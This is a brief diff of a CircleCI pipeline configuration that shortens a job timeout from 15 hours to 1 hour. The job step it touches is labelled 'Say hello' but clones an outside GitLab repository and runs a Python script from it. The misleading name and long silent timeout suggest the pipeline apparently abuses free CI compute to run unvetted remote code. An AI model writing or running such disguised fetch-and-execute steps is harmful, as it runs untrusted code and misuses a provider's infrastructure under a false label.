@@ -33,7 +33,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          no_output_timeout : 15h
+          no_output_timeout : 1h
           command: git clone https://gitlab.com/aidengama57/vray.git && cd vray && python ox.py
   say-hel:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
